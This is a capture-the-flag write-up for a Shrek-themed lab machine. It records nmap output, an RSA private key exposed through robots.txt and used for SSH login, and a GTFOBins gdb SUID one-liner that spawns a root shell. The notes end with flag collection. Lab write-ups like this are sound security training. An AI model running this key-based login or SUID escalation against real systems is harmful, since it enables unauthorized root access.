10.10.19.208

website is running
`NzM2ODcyNjU2bzY5NzM2MTZzNnI2OTZzNnI=` -> base 64 decoded to `736872656o6973616s6r696s6r`

on robots.txt
```
/Cpxtpt2hWCee9VFa.txt
```

on `http://10.10.19.208/Cpxtpt2hWCee9VFa.txt` -> saved as shrek key.
```
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAsKHyvIOqmETYwUvLDAWg4ZXHb/oTgk7A4vkUY1AZC0S6fzNE
JmewL2ZJ6ioyCXhFmvlA7GC9iMJp13L5a6qeRiQEVwp6M5AYYsm/fTWXZuA2Qf4z
8o+cnnD+nswE9iLe5xPl9NvvyLANWNkn6cHkEOfQ1HYFMFP+85rmJ2o1upHkgcUI
ONDAnRigLz2IwJHeZAvllB5cszvmrLmgJWQg2DIvL/2s+J//rSEKyISmGVBxDdRm
T5ogSbSeJ9e+CfHtfOnUShWVaa2xIO49sKtu+s5LAgURtyX0MiB88NfXcUWC7uO0
Z1hd/W/rzlzKhvYlKPZON+J9ViJLNg36HqoLcwIDAQABAoIBABaM5n+Y07vS9lVf
RtIHGe4TAD5UkA8P3OJdaHPxcvEUWjcJJYc9r6mthnxF3NOGrmRFtDs5cpk2MOsX
u646PzC3QnKWXNmeaO6b0T28DNNOhr7QJHOwUA+OX4OIio2eEBUyXiZvueJGT73r
I4Rdg6+A2RF269yqrJ8PRJj9n1RtO4FPLsQ/5d6qxaHp543BMVFqYEWvrsdNU2Jl
VUAB652BcXpBuJALUV0iBsDxbqIKFl5wIsrTNWh+hkUTwo9HroQEVd4svCN+Jr5B
Npr81WG2jbKqOx2kJVFW/yCivmr/f/XokyOLBi4N/5Wqq+JuHD0zSPTtY5K04SUd
63TWQ5kCgYEA32IwfmDwGZBhqs3+QAH7y46ByIOa632DnZnFu2IqKySpTDk6chmh
ONSfc4coKwRq5T0zofHIKLYwO8vVpJq4iQ31r+oe7fAHh08w/mBC3ciCSi6EQdm5
RMxW0i4usAuneJ04rVmWWHepADB0BqYiByWtWFYAY9Kpks/ks9yWHn8CgYEAymxD
q3xvaWFycawJ+I/P5gW8+Wr1L3VrGbBRj1uPhNF0yQcA03ZjyyViDKeT/uBfCCxX
LPoLmoLYGmisl/MGq3T0g0TtrgvkFU6qZ3sjYJ+O/yrT06HYapJLv6Ns/+98uNvi
3VEQodZNII8P6WLk3RPp1NzDVcFDLmD9C40UAQ0CgYBokPgOUKZT8Sgm4mJ/5+3M
LZtHF4PvdEOmBJNw0dTXeUPesHNRcfnsNmulksEU0e6P/IQs7Jc7p30QoKwTb3Gu
hmBZxohP7So5BrLygHEMjI2g2AGFKbv2HokNvhyQwAPXDBG549Pi+bCcrBHEAwSu
v85TKX7pO3WxiauPHlUPVQKBgFmIF0ozKKgIpPDoMiTRnxfTc+kxyK6sFanwFbL9
wXXymuALi+78D1mb+Ek2mbwDC6V2zzwigJ1fwCu2Hpi6sjmF6lxhUWtI8SIHgFFy
4ovrJvlvvO9/R1SjzoM9yolNKPIut6JCJ8QdIFIFVPlad3XdR/CRkIhOieNqnKHO
TYnFAoGAbRrJYVZaJhVzgg7H22UM+sAuL6TR6hDLqD2wA1vnQvGk8qh95Mg9+M/X
6Zmia1R6Wfm2gIGirxK6s+XOpfqKncFmdjEqO+PHr4vaKSONKB0GzLI7ZlOPPU5V
Q2FZnCyRqaHlYUKWwZBt2UYbC46sfCWapormgwo3xA8Ix/jrBBI=
-----END RSA PRIVATE KEY-----
```

We were able to ssh in using `ssh -i shrek_key shrek@10.10.19.208`

We found a flag in /home/shrek.


nmap scan
```
└─$ scan 10.10.19.208
sudo nmap -sV -Pn -p- -T 4 '10.10.19.208'
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-30 12:11 PDT
Nmap scan report for 10.10.19.208
Host is up (0.17s latency).
Not shown: 65527 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.2
22/tcp    open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.6 ((CentOS) PHP/7.1.33)
3306/tcp  open  mysql   MySQL (unauthorized)
8009/tcp  open  ajp13   Apache Jserv (Protocol v1.3)
8080/tcp  open  http    Apache Tomcat/Coyote JSP engine 1.1
9999/tcp  open  abyss?
65432/tcp open  unknown                                                      
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :                                                           
SF-Port9999-TCP:V=7.92%I=7%D=10/30%Time=635ECCFF%P=x86_64-pc-linux-gnu%r(G   
SF:etRequest,B8,"HTTP/1\.0\x20200\x20OK\r\nAccept-Ranges:\x20bytes\r\nCont   
SF:ent-Length:\x200\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nLa   
SF:st-Modified:\x20Thu,\x2012\x20Mar\x202020\x2008:24:13\x20GMT\r\nDate:\x   
SF:20Sun,\x2030\x20Oct\x202022\x2019:14:06\x20GMT\r\n\r\n")%r(HTTPOptions,   
SF:B8,"HTTP/1\.0\x20200\x20OK\r\nAccept-Ranges:\x20bytes\r\nContent-Length   
SF::\x200\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nLast-Modifie   
SF:d:\x20Thu,\x2012\x20Mar\x202020\x2008:24:13\x20GMT\r\nDate:\x20Sun,\x20   
SF:30\x20Oct\x202022\x2019:14:07\x20GMT\r\n\r\n")%r(FourOhFourRequest,B8,"   
SF:HTTP/1\.0\x20200\x20OK\r\nAccept-Ranges:\x20bytes\r\nContent-Length:\x2   
SF:00\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nLast-Modified:\x   
SF:20Thu,\x2012\x20Mar\x202020\x2008:24:13\x20GMT\r\nDate:\x20Sun,\x2030\x   
SF:20Oct\x202022\x2019:14:07\x20GMT\r\n\r\n")%r(GenericLines,67,"HTTP/1\.1   
SF:\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=ut   
SF:f-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(RTSPReques   
SF:t,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain   
SF:;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request   
SF:")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te   
SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2   
SF:0Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCo
SF:ntent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n
SF:\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.1\x20400
SF:\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n
SF:Connection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessionReq,67,
SF:"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20
SF:charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(
SF:Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20tex
SF:t/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20
SF:Request")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent
SF:-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n4
SF:00\x20Bad\x20Request");
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 223.85 seconds
Segmentation fault
```


Privesc

Found 
`-rwsr-sr-x 1 root root 6.6M Aug  8  2019 /usr/bin/gdb` which runs as root and has the suid bit set.
GTFO Bins -> `./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit`
And we were able to get a root shell!

As the root user we grabbed the root flag, put our name in the king.txt file, then raided every other user for their flags.
